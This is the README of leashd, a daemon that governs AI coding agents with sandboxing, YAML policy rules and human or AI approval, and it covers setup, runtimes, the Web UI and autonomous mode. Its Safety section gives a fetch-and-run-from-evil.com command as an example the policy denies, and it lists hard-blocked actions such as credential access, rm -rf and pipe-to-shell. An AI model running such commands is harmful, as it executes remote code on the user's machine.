# leashd

**Safety-first agentic coding framework. Run AI coding agents as a background daemon — govern them with policy rules, approve actions from your browser or phone, or let them run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation. Ships with a built-in Web UI that works as a PWA — install it on your phone and get push notifications for approvals. Supports multiple runtimes: Claude CLI (native subprocess, no SDK), Claude Code (SDK), OpenAI Codex, and more.**

[![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![Coverage 89%+](https://img.shields.io/badge/coverage-89%25%2B-brightgreen.svg)](#development)
[![Status: Alpha](https://img.shields.io/badge/status-alpha-orange.svg)](#status)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)

---

leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions through the built-in **Web UI** in your browser — no account creation, no third-party services, just `localhost`. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching the coding agent. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives adaptive workflows via a think-act-observe loop, and a test-and-retry loop ensures quality — all without you lifting a finger. Everything is logged to an append-only audit trail.

The Web UI is a **Progressive Web App** — install it on your phone's home screen and get **push notifications** for approvals and escalations, even when the browser is closed. Run `leashd webui tunnel` to expose it via ngrok, Cloudflare, or Tailscale — same interface, same features, accessible anywhere. Or add the optional **Telegram** connector if you prefer a native chat app.

leashd supports **pluggable agent runtimes** — Claude Code and OpenAI Codex ship built-in, and new runtimes can be added via the registry pattern. The same safety pipeline, approval flow, and audit trail apply regardless of which runtime you use. Switch runtimes with a single CLI command. **Claude Code plugins** can be managed mid-session via the CLI or chat commands.

You can also send **file attachments** — photos, screenshots, and PDFs — via the Web UI or Telegram and they're threaded through to the agent with vision support.

The result: install, `leashd init`, open your browser, and start coding — with guardrails you define, on the AI runtime of your choice.

---

## How It Works

### Interactive Mode

```
Your browser (Web UI) ──┐
                        ├─▶ MultiConnector
Your phone (Telegram) ──┘        │
                            leashd daemon      ← runs in background on your dev machine
                                 │
                                 ├─ 1. Sandbox       ← path-scoped: blocks anything outside approved dirs
                                 ├─ 2. Policy rules  ← YAML: allow / deny / require_approval per tool/command
                                 └─ 3. Human gate    ← Approve / Reject buttons in Web UI or Telegram
                                         │
                                         ▼
                                  Agent runtime      ← Claude Code, Codex, or custom — reads files, writes code, runs tests
```

### Autonomous Mode

```
/task "Add health check endpoint"  (Web UI or Telegram)
        │
        ▼
   Task Orchestrator (v2 — LLM-driven conductor)
        │
        ├─ think    ← conductor assesses progress, decides next action
        ├─ act      ← executes chosen action (explore, plan, implement, test, verify, fix, review, pr)
        ├─ observe  ← evaluates result, updates task memory
        └─ loop     ← repeats until task is complete or escalates to human
                │
                ▼
   You get a PR link — or an escalation message if the agent gets stuck
```

AI approval replaces human taps: a secondary AI call evaluates each `require_approval` tool call in context and decides automatically. Plan reviews are always forwarded to the human — you see the plan before implementation begins. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.

Sessions are **multi-turn**: the agent remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").

---

## Quick Start

### Prerequisites

- **Python 3.10+**
- **At least one agent runtime:**
  - **[Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)** — installed and authenticated. The `claude` command must work in your terminal. *(default runtime)*
  - **[Codex CLI](https://developers.openai.com/codex/cli)** — installed and authenticated. The `codex` command must work in your terminal.

### 1. Install

```bash
pip install leashd
```

Or with [uv](https://docs.astral.sh/uv/) (recommended):

```bash
uv tool install leashd
```

### 2. Run the setup wizard

```bash
leashd init
```

The wizard prompts you for your approved directory/directories, sets up the **Web UI** (you pick an API key and port), and writes `~/.leashd/config.yaml`. No manual config file editing needed. That's it — no accounts, no third-party services.

### 3. Start the daemon

```bash
leashd start
```

leashd starts in the background. Check it with `leashd status`, stop it with `leashd stop`.

### 4. Open the Web UI and start coding

Open `http://localhost:8080` (or whatever port you chose), enter your API key, and send something like:

> "Add a health check endpoint to the FastAPI app"

The agent starts working. When it needs to do something gated by policy (e.g. write a file), you'll get an **Approve / Reject** button right in the browser.

You can also drag-and-drop photos, screenshots, or PDFs — the agent sees them via vision.

### Optional: install as a PWA

The Web UI works as a Progressive Web App. In Chrome or Safari, tap "Add to Home Screen" (mobile) or "Install" (desktop) to get a standalone app with push notifications — approval requests arrive on your lock screen even when the browser is closed.

### Optional: access from your phone

Expose the Web UI over the internet with a single command:

```bash
leashd webui tunnel                           # uses ngrok by default
leashd webui tunnel --provider cloudflare      # or Cloudflare Tunnel
leashd webui tunnel --provider tailscale       # or Tailscale Funnel
```

This starts a tunnel pointing to your WebUI port, prints the public URL, and optionally sends it to your Telegram chat. Open the URL on your phone and you get the full Web UI — streaming, approvals, file attachments, everything. The tunnel process is managed by the daemon and stops when the daemon stops.

> **Security note:** When a tunnel is active, your `LEASHD_WEB_API_KEY` is your only line of defense. Choose a strong key. Failed auth attempts are rate-limited (5 failures → 60s lockout).

### Alternative: Telegram connector

Prefer a native chat app? Add the Telegram connector:

1. Open Telegram and search for **@BotFather**
2. Send `/newbot` and follow the prompts
3. Copy the **token** BotFather gives you (looks like `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)
4. Message **@userinfobot** to get your numeric **user ID** (e.g. `981234567`)
5. Run `leashd init` again or set the env vars directly:

```env
LEASHD_TELEGRAM_BOT_TOKEN=your-token-here
LEASHD_ALLOWED_USER_IDS=your-user-id
```

Restart the daemon and both connectors run simultaneously — same engine, same sessions.

---

## What's New in 0.12.0

**Agentic task orchestrator v2** — the task orchestrator now uses an LLM-driven think-act-observe loop instead of a fixed phase pipeline. A conductor evaluates progress after each step and dynamically chooses the next action — explore, plan, implement, test, verify, fix, review, or create a PR. Simple tasks skip straight to implementation; complex ones get full exploration and planning. The conductor escalates to the human after 3 consecutive parse failures or CLI errors instead of looping.

**Task memory** — each task maintains persistent working memory (up to 8K chars) that carries context across steps and survives daemon restarts. The conductor reads and updates this memory at each think step, so the agent doesn't lose track of what it's already done or learned about the codebase.

**Browser-based verification and self-review** — autonomous tasks can now verify their own output by launching a browser and checking the result visually, and perform a self-review step before creating a PR.

**Context management** — git-backed checkpointing captures codebase state between actions, observation masking keeps the conductor's context window focused on what matters, and phase summarization compresses earlier observations so long-running tasks don't blow the context budget.

See [CHANGELOG.md](CHANGELOG.md) for the full history.

---

## Runtimes

leashd supports pluggable agent runtimes. The same safety pipeline, approval flow, audit trail, and connector integration work identically regardless of which runtime you use.

```bash
leashd runtime list          # list available runtimes
leashd runtime show          # show active runtime and its capabilities
leashd runtime set codex     # switch to Codex runtime
leashd runtime set claude-code   # switch to Claude Code (SDK)
leashd runtime set claude-cli    # switch to Claude CLI (default)
```

| Runtime | Backend | Session Resume | Autonomous Mode | Install | Stability |
|---|---|---|---|---|---|
| **claude-cli** *(default)* | Claude CLI (native subprocess) | NDJSON session IDs | Full (task orchestrator, auto-approver) | `claude` CLI authenticated | beta |
| **claude-code** | Claude Code CLI (SDK) | SDK sessions | Full (task orchestrator, auto-approver) | `claude` CLI + `claude-agent-sdk` | stable |
| **codex** | Codex CLI | Thread IDs | Full (streaming + approval bridge) | `codex` CLI authenticated | beta |

All runtimes support interactive approval, streaming responses, and the full autonomous pipeline. Each runtime declares its capabilities via an agent capabilities model — leashd adapts features like session resume and approval routing automatically.

**Adding custom runtimes** — extend the `SubprocessAgent` base class for any CLI-driven agent tool and register it with the runtime registry.

---

## Daemon Mode

leashd runs as a background process by default.

```bash
leashd start           # start daemon (background)
leashd start -f        # start in foreground (useful for debugging)
leashd status          # check if daemon is running
leashd stop            # graceful shutdown
leashd restart         # stop + start
leashd reload          # reload config without restart (SIGHUP)
leashd version         # print version and exit
```

Logs go to `~/.leashd/logs/app.log` by default. Set `LEASHD_LOG_DIR` to change the path.

---

## Autonomous Mode

Autonomous mode replaces manual approval taps with AI evaluation, adds a post-task test-and-retry loop, and drives adaptive autonomous tasks through the task orchestrator. Plan reviews are always forwarded to the human — the AI approver handles routine tool calls, not plans. Send `/task <description>` from the Web UI or Telegram and come back to a PR — or an escalation message if the agent gets stuck.

```bash
leashd autonomous          # show current autonomous settings
leashd autonomous setup    # run autonomous config wizard
leashd autonomous enable   # quick-enable with defaults
leashd autonomous disable  # disable autonomous mode
```

### Three Guarantees

1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. Plan reviews always route to the human. The AI approver only handles `require_approval` decisions, never `deny` decisions.
2. **Fail-safe defaults** — the AutoApprover fails closed (denies on error), the AutonomousLoop escalates to the human when retries are exhausted, and circuit breakers cap both approval calls and plan revisions per session. The conductor escalates after 3 consecutive parse failures or CLI errors instead of looping indefinitely.
3. **Full auditability** — every AI approval decision is logged with `approver_type` in the same append-only JSONL audit trail. Task memory contents are persisted and recoverable. No decision is invisible.

### Task Orchestrator vs Autonomous Loop

| Aspect | `/task` (Task Orchestrator) | `/edit` (Autonomous Loop) |
|---|---|---|
| **Use when** | Starting from scratch — "build feature X" | You know what to change — "fix the login bug" |
| **How it works** | LLM-driven think-act-observe loop — conductor assesses complexity and dynamically chooses actions (explore, plan, implement, test, verify, fix, review, pr) | Single-shot: implement → test → retry |
| **Planning** | Adaptive — simple tasks skip planning; complex ones get exploration and spec first | No planning — goes straight to implementation |
| **Task memory** | Persistent working memory (8K chars) across steps and daemon restarts | None — starts over |
| **Crash recovery** | Full — task memory and git-backed checkpoints survive daemon restarts | None — starts over |
| **Cost tracking** | Per-action breakdown and total | Session-level only |

See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md) for a full walkthrough and the [Autonomous Mode Reference](docs/autonomous-mode.md) for the technical details.

---

## Configuration

leashd is configured primarily through CLI commands — no manual file editing needed. Run `leashd init` once, then use subcommands for everything else.

### Setup and inspection

```bash
leashd init       # first-time setup wizard — writes ~/.leashd/config.yaml
leashd config     # show resolved config (all layers merged)
```

### Approved directories

```bash
leashd add-dir /path/to/project    # approve a directory
leashd remove-dir /path/to/project # revoke approval
leashd dirs                         # list approved directories
```

### Runtimes

```bash
leashd runtime list        # list available runtimes
leashd runtime show        # show active runtime and capabilities
leashd runtime set codex   # switch runtime
```

### Autonomous mode

```bash
leashd autonomous setup    # guided setup for autonomous features
leashd autonomous enable   # quick-enable with defaults
leashd autonomous disable  # disable autonomous mode
leashd autonomous show     # show current autonomous config
```

### Web UI

```bash
leashd webui show       # show current WebUI config (enabled, port, key)
leashd webui enable     # enable WebUI and set API key + port
leashd webui disable    # disable WebUI
leashd webui url        # print the WebUI URL
leashd webui tunnel     # expose WebUI via tunnel (ngrok by default)
leashd webui tunnel --provider cloudflare   # use Cloudflare Tunnel
leashd webui tunnel --provider tailscale    # use Tailscale Funnel
```

### Browser

```bash
leashd browser show                                  # show backend and profile
leashd browser set-backend agent-browser              # switch browser backend
leashd browser set-profile ~/.leashd/browser-profile  # set persistent profile
leashd browser clear-profile                           # remove profile
leashd browser headless                                # toggle headless mode
```

### Max turns

```bash
leashd turns show        # display current max turns setting
leashd turns set <N>     # set max turns to N (positive integer)
```

Max turns can also be adjusted from the WebUI Settings page.

### Task orchestrator version

```bash
leashd task version show       # display current version (v1, v2, or v3)
leashd task version set v3     # switch to v3 (linear plan→implement→verify→review pipeline)
leashd task version set v2     # switch back to v2 (LLM-driven think-act-observe loop, default)
```

Restart the daemon (`leashd restart`) to pick up the new version.

### Thinking effort

```bash
leashd effort show       # display current effort level
leashd effort set high   # set effort level (low, medium, high, max)
```

### Plugins

```bash
leashd plugin list                  # list installed plugins and their status
leashd plugin add <source>          # install a Claude Code SDK plugin
leashd plugin remove <name>         # uninstall a plugin
leashd plugin enable <name>         # enable a disabled plugin
leashd plugin disable <name>        # disable a plugin without removing it
```

Plugins can also be managed mid-session via the `/plugin` chat command — no daemon restart needed.

### Skills

```bash
leashd skill list              # list installed skills (default)
leashd skill add skill.zip     # install from zip archive
leashd skill remove my-skill   # uninstall a skill
leashd skill show my-skill     # show skill details
```

### Workspaces

```bash
leashd ws add my-saas ~/src/api ~/src/web   # create a workspace
leashd ws add my-saas ~/src/worker           # add a dir to existing workspace
leashd ws list                               # list all workspaces
leashd ws show my-saas                       # inspect repos in a workspace
leashd ws remove my-saas ~/src/worker        # remove a dir from workspace
leashd ws remove my-saas                     # remove entire workspace
```

Workspaces group related repos so the agent gets multi-repo context. `CLAUDE.md` files from all workspace directories are loaded via SDK `add_dirs`.

### Workflows

```bash
leashd workflow list         # list available playbooks
leashd workflow show <name>  # show playbook details
```

Place YAML playbooks in `.leashd/workflows/` (project) or `~/.leashd/workflows/` (global).

### Maintenance

```bash
leashd clean    # remove all runtime artifacts
leashd reload   # reload config without restart (SIGHUP)
```

### Config layering

leashd uses a layered config system — each layer overrides the one before it:

```
~/.leashd/config.yaml   ← global base (managed by leashd init / CLI commands)
.env in your project    ← per-project overrides
environment variables   ← highest priority
```

All settings are environment variables prefixed with `LEASHD_`. The CLI commands above manage most of them automatically. See [docs/configuration.md](docs/configuration.md) for the full environment variable reference (40+ settings).

---

## Safety

Every tool call the agent makes passes through a three-layer pipeline before it can execute:

**1. Sandbox** — The agent can only touch files inside `LEASHD_APPROVED_DIRECTORIES`. Path traversal attempts are blocked immediately and logged as security violations.

**2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.

**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to the Web UI or Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). Plan reviews are always forwarded to the human, even when the AI auto-approver is active. If no response within the timeout, the action is auto-denied.

The safety pipeline is **runtime-agnostic** and **connector-agnostic** — the same sandbox, policy rules, and approval flow apply whether you're running Claude Code or Codex, and whether you're approving from the Web UI or Telegram.

Everything is logged to `.leashd/audit.jsonl` — every tool attempt, every decision, every approver type.

### Built-in policies

leashd ships five policies in `policies/`:

**`default.yaml`** *(recommended)* — balanced for everyday use.
- Auto-allows: file reads, search, grep, git status/log/diff, read-only browser tools
- Requires approval: file writes/edits, git push/rebase/merge, network commands, browser mutations
- Hard-blocks: credential file access, `rm -rf`, `sudo`, force push, pipe-to-shell, SQL DROP/TRUNCATE

**`strict.yaml`** — maximum safety, more approval taps.
- Auto-allows: only reads (`Read`, `Glob`, `Grep`, `LS`)
- Requires approval: everything else
- 2-minute approval timeout

**`permissive.yaml`** — for trusted environments where you want minimal interruptions.
- Auto-allows: reads, writes, package managers, test runners, git add/commit/stash, all browser tools
- Requires approval: git push, network commands, anything not explicitly listed
- 10-minute approval timeout

**`dev-tools.yaml`** *(overlay)* — auto-allows common dev commands. Loaded alongside `default.yaml` by default.
- Auto-allows: linters (`ruff`, `eslint`, `prettier`), test runners (`pytest`, `jest`, `vitest`), package managers (`npm install`, `pip install`, `uv sync`, `cargo build`)

**`autonomous.yaml`** — for fully autonomous operation with [task orchestrator](docs/autonomous-setup-guide.md).
- Auto-allows: file writes, test runners, linters, package managers, safe git, GitHub CLI PR
- AI-evaluated: git push (feature branches), network commands, browser mutations
- Hard-blocks: credentials, force push, push to main/master, `rm -rf`, `sudo`, pipe-to-shell

Switch policies (in your `.env` or as an env var):

```env
LEASHD_POLICY_FILES=policies/strict.yaml
```

Combine multiple policy files (rules merged, evaluated in order):

```env
LEASHD_POLICY_FILES=policies/default.yaml,policies/my-overrides.yaml
```

---

## Commands

These slash commands are available in both the Web UI and Telegram:

| Command | Description |
|---|---|
| `/plan <text>` | Switch to plan mode and start — agent proposes, you approve before execution |
| `/edit <text>` | Switch to edit mode and start — direct implementation |
| `/default` | Switch back to balanced default mode |
| `/dir` | Switch working directory (inline buttons). Blocked while an agent is running. |
| `/git <subcommand>` | Full git suite: status, branch, checkout, diff, log, add, commit, push, pull |
| `/web <instruction>` | Autonomous web automation with content-level human approval |
| `/test` | 9-phase agent-driven test workflow with browser automation |
| `/task <description>` | Autonomous adaptive task: think-act-observe loop → PR |
| `/tasks` | List active and recent tasks for the current chat |
| `/stop` | Stop all ongoing work (agent, task, loop) without resetting session |
| `/cancel` | Cancel the active task in the current chat |
| `/plugin` | Manage Claude Code plugins mid-session (install, remove, enable, disable) |
| `/ws` | Manage workspaces inline. Blocked while an agent is running. |
| `/status` | Show current session, mode, and directory |
| `/clear` | Clear conversation history, cancel active tasks, and start fresh |

---

## Workspaces

Workspaces group related repositories so the agent gets multi-repo context across all of them simultaneously. Configure workspaces via `leashd ws` — see [Configuration > Workspaces](#workspaces) for the full command reference. When active, `CLAUDE.md` files from all workspace directories are loaded and the agent's system prompt includes multi-repo context.

---

## Session Persistence

All sessions are stored in a centralized SQLite database at `~/.leashd/messages.db` and persist across daemon restarts — the agent remembers conversation context between sessions. Every message is stored with cost, duration, and session metadata. The centralized database ensures Web UI and Telegram sessions don't conflict when running concurrently.

For development or testing, use in-memory storage (in `.env`):

```env
LEASHD_STORAGE_BACKEND=memory
```

---

## Web UI

The Web UI is leashd's primary interface — a full browser-based chat that runs on `localhost` with zero external dependencies:

```bash
leashd webui enable    # set API key and port (or configure during leashd init)
leashd start           # start daemon with WebUI
```

Open `http://localhost:8080` and enter your API key. The Web UI provides:

- **Real-time streaming** — responses stream via WebSocket as the agent types
- **Inline approvals and interactions** — Approve / Reject prompts and question modals, same as Telegram
- **Push notifications** — Web Push alerts on your lock screen when the browser is closed, in-page notifications with audio chime and tab title flash when the tab is in the background, and optional Telegram cross-notification with deep links
- **Installable PWA** — add to home screen on iOS, Android, or desktop for a standalone app experience with proper safe-area handling on notched devices
- **Seamless reconnection** — pending approvals, questions, and in-progress drafts are preserved across reconnects; 120-second grace period keeps sessions alive through sleep/wake cycles; instant reconnect on phone unlock
- **Mobile-friendly input** — on mobile, the Enter key inserts a newline; use the Send button to submit. Designed for composing multi-line prompts on a phone keyboard.
- **27 color themes** — Dracula, Monokai, Catppuccin, Nord, Synthwave, Matrix, and more, each with dark and light variants, selectable from Settings
- **Conversation history** — sidebar with past conversations, searchable
- **Directory and workspace tabs** — switch working directory or workspace without slash commands
- **Settings page** — configure runtime, effort, max turns, themes, and other settings from the browser
- **Markdown rendering** — syntax-highlighted code blocks, tables, and formatting
- **Mobile-responsive** — usable on phone browsers; pair with `leashd webui tunnel` for remote access
- **File attachments** — drag-and-drop photos, screenshots, and PDFs

### Remote access via tunnel

Access the Web UI from your phone or any device — no Telegram required:

```bash
leashd webui tunnel                           # ngrok (default)
leashd webui tunnel --provider cloudflare      # Cloudflare Tunnel
leashd webui tunnel --provider tailscale       # Tailscale Funnel
```

The command starts a tunnel to your WebUI port, prints the public URL, and optionally sends it to your Telegram chat so you can open it on your phone with one tap. The tunnel process is a child of the daemon — when the daemon stops, the tunnel stops.

The tunnel provider CLI (`ngrok`, `cloudflared`, or `tailscale`) must be installed separately. When exposed publicly, your `LEASHD_WEB_API_KEY` is your authentication layer — choose a strong key. Failed auth attempts are rate-limited (5 failures → 60s lockout).

Both connectors can run simultaneously via the **MultiConnector** — configure the WebUI alongside Telegram, and leashd routes messages to the right client automatically. Both share the same Engine, so a task started from the Web UI can be monitored from Telegram and vice versa.

See [docs/webui.md](docs/webui.md) for the full WebUI guide.

---

## Browser Automation

leashd supports two browser backends for the `/web` and `/test` commands — both gated by the same safety pipeline:

| Backend | Install | Best for |
|---|---|---|
| [agent-browser](https://github.com/vercel-labs/agent-browser) *(default)* | `npm install -g agent-browser && agent-browser install` | Fast Rust CLI, snapshot-based refs, headless by default |
| [Playwright MCP](https://github.com/playwright-community/mcp) | `npx playwright install chromium` | Test generation, MCP-native tooling |

Switch backends and manage profiles via `leashd browser` — see [Configuration > Browser](#browser) for all commands.

**agent-browser** *(default)* — Vercel's headless browser CLI with a native Rust binary and Node.js fallback. Uses accessibility-tree snapshots with deterministic element refs (`@e1`, `@e2`) for reliable AI-driven interaction. Runs headless by default. Supports cloud providers (Browserbase, Browser Use, Kernel) and iOS Simulator via the `-p` flag.

**Playwright MCP** — the `.mcp.json` at the project root pre-configures Claude Code to spawn the Playwright MCP server. Read-only browser tools (snapshots, screenshots) are auto-allowed in `default.yaml`; mutation tools (click, navigate, type) require approval.

**Web session checkpoints** — `/web` sessions automatically persist progress, so if the agent crashes mid-workflow it resumes from the last checkpoint instead of restarting.

See [docs/browser-testing.md](docs/browser-testing.md) for Chrome profile paths by OS, the full tool reference, and policy details.

### Typical workflow

1. Start your dev server (`npm run dev`, `uvicorn`, etc.)
2. In the Web UI or Telegram: `/test --url http://localhost:3000`
3. The agent navigates, verifies, and reports — each mutation tap needs your approval

Or use the `/web` command for general web automation:

1. In the Web UI or Telegram: `/web check my GitHub notifications`
2. The agent navigates using your persistent browser profile, reads content, and reports back
3. Any actions (commenting, clicking) are proposed via `AskUserQuestion` for your approval

---

## Streaming

Responses stream in real time in both the Web UI and Telegram — the message updates progressively as the agent types. While tools are running, you see a live indicator (e.g., `🔧 Bash: pytest tests/`). The final message includes a tool usage summary (e.g., `🧰 Bash ×3, Read, Glob`).

Disable in `.env`:

```env
LEASHD_STREAMING_ENABLED=false
```

---

## CLI Mode

No WebUI and no Telegram token? leashd falls back to a local REPL — useful for testing your config:

```bash
# Don't set LEASHD_WEB_ENABLED or LEASHD_TELEGRAM_BOT_TOKEN, then:
leashd start -f
# > type your prompts here
```

Note: actions requiring approval are auto-denied in CLI mode since there's no approval UI.

---

## Logging

leashd uses [structlog](https://www.structlog.org/) for structured logging. Set log level in `.env`:

```env
LEASHD_LOG_LEVEL=DEBUG     # full trace including policy decisions
LEASHD_LOG_LEVEL=INFO      # default — operational events
LEASHD_LOG_LEVEL=WARNING   # warnings and errors only
```

File logging (JSON, rotating) is enabled by default:

```env
LEASHD_LOG_DIR=~/.leashd/logs
```

Key log event sequence at `INFO`:

```
engine_building → engine_built → daemon_starting → session_created →
request_started → agent_execute_started → agent_execute_completed →
request_completed
```

---

## Architecture

leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the active agent runtime, and sends responses back. The **MultiConnector** manages simultaneous connectors (Web UI, Telegram) with chat_id-based routing — both share the same Engine, so sessions, approvals, and task state are unified. The **RuntimeRegistry** manages pluggable agent backends — each runtime registers its capabilities (streaming, session resume, tool approval, autonomous support) and the Engine adapts accordingly. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Storage is centralized in `messages.db` to prevent race conditions across concurrent connector sessions. The **TaskOrchestrator** runs an LLM-driven think-act-observe loop with persistent task memory, and the **AutonomousLoop** handles post-task test-and-retry — both plug into the event bus.

```
Web UI connector ────┐
                     ├─▶ MultiConnector (chat_id routing)
Telegram connector ──┘         │
                          Middleware (auth, rate limit)
                               │
                            Engine ──── EventBus ──── TaskOrchestrator (think-act-observe)
                               │                       AutonomousLoop
                          RuntimeRegistry               TaskMemory
                               ├─ Claude CLI
                               ├─ Claude Code
                               ├─ Codex
                               └─ (custom)
                               │
                          Gatekeeper ──────────────────────────────┐
                               │                                   │
                          Active agent runtime          1. Sandbox check
                               │                        2. Policy rule match
                               └── tool call ──────────▶ 3. Human / AI approval
```

---

## Development

```bash
# Clone and install (including dev dependencies)
git clone git@github.com:vmehera123/leashd.git && cd leashd
uv sync

# Run tests
uv run pytest tests/
uv run pytest tests/test_policy.py -v          # single file
uv run pytest --cov=leashd tests/              # with coverage

# Lint and format
uv run ruff check .
uv run ruff check --fix .
uv run ruff format .

# Full check (lint + format + mypy + all tests including E2E + JS)
make check
```

### E2E browser tests

The E2E tests use Playwright to drive a real browser against the WebUI. They require a one-time Chromium install:

```bash
uv run playwright install chromium

# Run E2E tests only
uv run pytest -m e2e -v
```

CI runs unit and E2E tests separately so Playwright setup issues don't block unit test results.

### JS unit tests

Unit tests for WebUI utility functions (`leashd/data/webui/utils.js`) use Vitest and require Node.js:

```bash
cd tests/js
npm install
npm test
```

---

## Status

leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Web UI, Telegram integration, policy engine, task orchestrator, multi-runtime support) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.

If you hit a bug or have a feature idea, [open an issue](https://github.com/vmehera123/leashd/issues).

---

## License

[Apache 2.0](LICENSE)
